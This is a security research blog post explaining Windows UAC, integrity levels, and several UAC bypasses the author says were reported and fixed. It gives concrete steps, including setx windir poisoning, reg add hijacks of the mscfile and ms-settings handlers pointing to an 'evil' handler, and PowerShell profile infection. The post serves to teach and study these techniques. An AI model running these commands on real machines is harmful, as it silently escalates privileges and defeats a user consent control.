# A bit about UAC bypasses
Today I wanted to talk a bit about UAC bypasses; I found quite a lot of those back in 2017 and wanted to share some insights.  
In this blogpost I will describe what UAC is, how to approach UAC bypass hunting and what the future might hold.

## Motivation for UAC
`User Account Control` (or `UAC` for short) is an security enforcement feature introduced in Windows Vista.  
In the Windows ecosystem, most users run as a local administrator, which is problematic; the security boundary between non-administrator and administrator in Windows is clear, but there is no clear boundary between administrator and running as the `SYSTEM` user (can be easily be done with a `Windows Service`, for example). Today we have other boundaries such as `Protected Processes` and the kernel (enforced with `DSE`) not to mention hypervison technology, but the boundary between administrator and non-administrator is pointless in a world where everyone runs as a local admin.  
To address the problem, Microsoft introduced `UAC`, which splits the administrator token into two parts: one has restricted privileges (similar to a non-administrator user) and one has elevated privileges. When a privileged operation is about to happen, a user must consent to the operation, and then the elevated token could be used. This procedure is known as `elevation`.  
This was not perceived well - Windows Vista is known to be full of UAC-style consent popups. To address that, several measures had to be taken:
- UAC has 4 different levels, ranging between not enforcing at all to "full UAC" (which is what happened during the Vista days). The default mode is somewhere "in-between"; most UAC bypasses focus this level. Those levels affect various registry values under `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`.
- Several binaries and COM objects are now `auto-elevated` (based on signature information) - more on that later!

## Integrity levels
Securable objects are anything that is associated with mandatory access control enforcement; processes, registry keys, process tokens and even desktop objects are good examples of that.  
When a process (or a thread) wants to access a certain securable resource (let's say, a file) - Windows examines the requesting token and compares it with the access list of the object. That kind of access list is maintained in something called a `DACL (discretionary access control list)`. For example, when trying to open a file for reading, the OS checks if the requesting token has read access to the file.  
In addition to the `DACL`, Windows introduced the concept of `SACL (system access control list)`. SACLs were mostly used for auditing purposes (i.e. when to log access attempts) but nowadays they also contain another bit of information called `Integrity Level`. The idea behind integrity levels is to add them to the access enforcement - if an access request passes the DACL check, integrity levels are also checked and enforced, in a sense that the requesting token's integrity level cannot be lower than the desired resource's integrity level. During the Vista days, multiple integrity levels were introduced: `Low`, `Medium`, `High` and `System`. UAC uses that enforcement - non-elevated tokens have `Medium integrity level`, while elevated ones have `High integrity level`.

Here's an example of viewing and changing integrity levels with the `icacls` utility:

```shell
C:\temp>echo hi > il_demo.txt

C:\temp>icacls il_demo.txt
il_demo.txt BUILTIN\Administrators:(I)(F)
            NT AUTHORITY\SYSTEM:(I)(F)
            BUILTIN\Users:(I)(RX)
            NT AUTHORITY\Authenticated Users:(I)(M)

Successfully processed 1 files; Failed processing 0 files

C:\temp>icacls il_demo.txt /setintegritylevel Low
processed file: il_demo.txt
Successfully processed 1 files; Failed processing 0 files

C:\temp>icacls il_demo.txt
il_demo.txt BUILTIN\Administrators:(I)(F)
            NT AUTHORITY\SYSTEM:(I)(F)
            BUILTIN\Users:(I)(RX)
            NT AUTHORITY\Authenticated Users:(I)(M)
            Mandatory Label\Low Mandatory Level:(NW)

Successfully processed 1 files; Failed processing 0 files

C:\temp>
```

As you can see, I created a file called `il_demo.txt`. Then:
- Viewing its access control list with `icacls` shows the access control entires from the `DACL` (e.g. full control (F) to Administrators), but we do not see an integrity level.
- Changing the integrity level to `low` with the `/setintegritylevel` flag changed it to low; we can see now `Mandatory Label\Low Mandatory Level:(NW)` in the output.
- An missing integrity level is interpreted a `Medium integrity level`.

## UAC bypasses
`UAC bypasses` are ways to bypass UAC, and will normally focus on the "default" UAC level, with no user interaction.  
While Microsoft currently does not consider UAC to be a "security boundary", UAC bypasses are still being investigated and Microsoft still handles UAC bypasses regularly.  
UAC bypasses come in different shapes and ideas; the best way to examine existing ones is by examining the excellent [UACME github repository](https://github.com/hfiref0x/UACME) which contains implementations of several UAC bypasses, as well as fix status and most importantly - implementation!

When searching for new UAC bypasses, the obvious targets are components that auto-elevate. Those include:
- `Auto elevated executables` - the best way to hunt for these is to look for an embedded manifest in them that says `<autoElevate>true</autoElevate>`.
- `Auto elevated COM objects` - those are DLLs that are under a specific list

Usually UAC bypasses are logic bugs that let an attacker affect an auto-elevated program's operation or flow in a way that ultimately executes arbitrary code. I'd like to share a few examples I discovered in the past (all of those were reported and fixed over time):

## Environment variable poisoning
The code flow in the auto-elevated `SystemSettingsAdminFlows.exe` when given the command-line argument `InstallInternalDeveloperModePackage` demonstrates this technique well:

```c
if (!ExpandEnvironmentStringsW(L"%windir%\\system32\\dism.exe, wszAppPath, 0x104))
{
    // Handle error
}

// ...

some_sprintf(
    wszCommandLine,
    L"%s /online /norestart /quiet /add-package /packagePath:\"\\\\ntdev.corp.microsoft.com\\release\\%s\\%s.%s.%s\\%s\\FeaturesOnDemand\\neutral\\cabs\\%s\"",
    wszAppPath,
    v16,
    dst,
    dst,
    v4,
    v14,
    L"Microsoft-OneCore-DeveloperMode-Desktop-Package.cab");

// ...

if (!CreateProcessW(NULL, wszCommandLine, NULL, NULL, 0, 0, NULL, NULL, &tStartupInfo, &tProcInfo)
{
    // Handle error
}
```

As can be seen, a child process will be created with [CreateProcessW](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessw) with a command-line affected by the `wszAppPath` variable, which in turn was built from the path `%windir%\system32\dism.exe`. Well, since the `windir` environment variable is expanded, we could easily poison it! Exploitation is simple:
1. Create a new directory `%temp%\system32`.
2. Place our payload in `%temp%\system32\dism.exe`.
3. Run `setx windir %temp%`.
4. Run `SystemSettingsAdminFlows.exe InstallInternalDeveloperModePackage`
5. Restore the `windir` environment variable after use.

The idea is that auto-elevated processes will spawn child processes with the same integrity level (at least by default, when using `CreateProcessW` as we've seen). A similar idea happens with the `ShellExecute(Ex)W\A` API, as we'll see soon.

## HKCU and file associations
This code was taken from an old version of `CompMgmtLauncher.exe`, which was an auto-elevated executable:

```c
pwszLinkPath = L"Computer Management.lnk";
if (tOsVer.wProductType == 1)
{
    bIsWorkstation = 1;
}
if (!bIsWorkstation)
{
    pwszLinkPath = L"Server Manager.lnk";
}
v3 = ResolveFullPath(wszFilePath, v0, pwszLinkPath);

// ...

tShlex.cbSize = 112;
tShlex.lpFile = wszFilePath;
tShlex.nShow = 5;
tShlex.lpVerb = L"open";
if (ShellExecuteExW(&tShlex))
{
    // Handle error
}
```

This code calls the [ShellExecuteExW](https://learn.microsoft.com/en-us/windows/win32/api/shellapi/nf-shellapi-shellexecuteexw) function to execute a child process, but this time to open a `lnk` file. This time we do not have environment variables to poison, but we can still poison the file association.  
File associations are maintained in the registry, and specify the default program that opens the given file. The OS maintains a "global" file association saved in the `HKLM` registry hive, but users can change their own file association without affecting other users - this results in a change in the `HKCU` hive. File associations are maintained in the `HKCR` hive, which is a merge between `HKLM` and `HKCU`, with the latter taking precedence!  
This is quite lucky since `HKLM` requires elevation to write to, but `HKCU` usually does not.  
Back to our scenario - the given LNK files (`Computer Management.lnk` or `Server Manager.lnk`) point to a `.msc` file. We can see the default `.msc` file handler, even in `cmd`:

```shell
C:\>assoc .msc
.msc=MSCFile

C:\>ftype MSCfile
MSCfile=%SystemRoot%\system32\mmc.exe "%1" %*
```

As you can see, `mmc.exe` is the handler for `.msc` files. A more direct approach can be taken by querying the registry:

```shell
C:\>reg query "HKCR\mscfile\shell\open\command"

HKEY_CLASSES_ROOT\mscfile\shell\open\command
    (Default)    REG_EXPAND_SZ    %SystemRoot%\system32\mmc.exe "%1" %*
```

According to our plan, we can change the file association of `mscfile` easily, therefore using a different handler. Exploitation steps:
1. Run `reg add HKCU\Software\Classes\mscfile\shell\open\command /ve /t REG_EXPAND_SZ /d "%temp%\my_evil_handler.exe" /f`.
2. Run `CompMgmtLauncher.exe`.
3. Delete the registry path under `HKCU` that we just created.

## HKCU and protocol associations
Simialrly to file associations, users can also change their URL schema \ protocol associations.  
This is helpful if, for instance, a user wishes to use a different browser - the handler for the `http://` schema would be different.  
Here's an example from `Fodhelper.exe`:

```c
memset(&tShlex, 0, 0x6C);
tShlex.hwnd = NULL;
tShlex.lpVerb = L"open";
tShlex.cbSize = 112;
tShlex.lpFile = L"ms-settings:optionalfeatures";
tShlex.fMask = 1280;
tShlex.fShow = 1;
ShellExecuteExW(&tShlex);
```

As before, the code calls the [ShellExecuteExW](https://learn.microsoft.com/en-us/windows/win32/api/shellapi/nf-shellapi-shellexecuteexw) function to execute a child process, this time to use the `ms-settings` URL schema. Very similarly, we can write to `HKCU`:
1. Run `reg query HKCU\Software\Microsoft\Windows\Shell\Associations\UrlAssociations\ms-settings\UserChoice /v ProgId` and save that as `%SettingsProgId%`.
2. Run `reg add HKCU\Software\Classes\%SettingsProgId%\shell\open\command /ve /t REG_EXPAND_SZ /d "%temp%\my_evil_handler.exe" /f`.
3. Run `FodHelper.exe`.
4. Delete the registry key we just created.

## Auto-elevated COM object interfaces
An attacker can use `out-of-proc auto-elevated COM objects` and invoke their interface. Invocation results in a new `dllhost.exe` elevated process hosting the COM DLL service, receiving requests and acting on its client's behalf.  
Many interesting COM objects exist, and I just so happened to find one in 2017 - one with `CLSID_ElevatedshellLink`. It exposed functionality to create a new link, here's how it looked like:

```c
STDAPI _CreateNewLink(CREATELINKDATAA* ptLinkData, INewShortcutHook* phsh)
{
    HRESULT hr = S_OK;
    
    if (ptLinkData->dwFlags & 0x200)
    {
        hr = CopyFile(ptLinkData->szExeName, ptLinkData->szLinkName, FALSE) ? S_OK : ResultFromKnownLastError();
    }
    
    // More stuff here
}
```

This allows an attacker to call `CopyFile` on arbitrary user-controlled source and destination paths, from an elevated context!  
For exploitation purposes, note that the OS will still pop-up a UAC prompt unless the auto-elevated COM object is `explorer.exe`. This can be resolved in two ways:
1. Inject to `explorer.exe` (you can do it without elevation, easily).
2. Fake your own `PEB` to make the OS think you are `explorer.exe`. This involves changing your command-line and the module list.

I talked about [injection](https://github.com/yo-yo-yo-jbo/injection_and_hooking_intro/) and the [PEB](https://github.com/yo-yo-yo-jbo/msf_shellcode_analysis/) in past posts, so I won't discuss them too much. You can find PEB spoofing implementations all around the internet, [this](https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Masquerade-PEB.ps1) is a good place to start.

## Auto-elevated tasks
Sometimes you might find scheduled tasks that run with high privileges, but triggerable from a non-elevated user.  
Those tasks might suffer from the same issues we've seen previously (registry poisoning, environment variable poisoning, path dependencies and others).  
Here's on example I found:

```powershell
PS C:\>(Get-ScheduledTask -TaskName "Update-Internal").Principal.RunLevel
Highest
PS C:\>(Get-ScheduledTask -TaskName "Update-Internal").Actions

Id               :
Arguments        : -windowstyle hidden -nonInteractive -nologo -ExecutionPolicy unrestricted -Command
                   "& Start-Process -WindowStyle Hidden -PassThru -FilePath \"C:\Program
                   Files\InternalUpdater\UpdCheck.ps1"
Execute          :
WorkingDirectory : C:\Program Files\InternalUpdater
PSComputerName   :
```

This scheduled task runs `PowerShell` without the `-NoProfile` flag!  
Profiles are stored in a writable directory, and therefore can be easily infected:

```powershell
echo "C:\temp\evil.exe" >> $profile
```

Note that `cmd.exe` without the `/d` flag has a similar property (this time using the `HKCU` registry path `HKCU\Software\Microsoft\Command Processor\AutoRun`)!

